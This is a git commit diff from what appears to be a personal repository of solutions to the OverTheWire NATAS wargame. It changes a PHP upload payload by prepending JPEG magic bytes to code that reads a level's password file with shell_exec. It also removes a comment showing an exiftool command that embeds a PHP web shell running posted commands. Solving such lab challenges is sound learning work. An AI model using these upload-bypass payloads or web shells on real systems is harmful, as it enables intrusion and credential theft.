2a60a74c40866e10d645330efadab46b08d0340c
David <mail@david-dankelmann.de>
2022-08-29 09:58:28 +0200

    add natas16 solution

--- NATAS/natas13.php
+++ NATAS/natas13.php
@@ -1,6 +1,4 @@
-<?php
-#Magic Bytes are checked, this is a template to create jpg with this
-#exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" natas13.php
-    $result = shell_exec("cat /etc/natas_webpass/natas13");
+ÿØÿà<?php
+    $result = shell_exec("cat /etc/natas_webpass/natas14");
     print($result);
 ?>
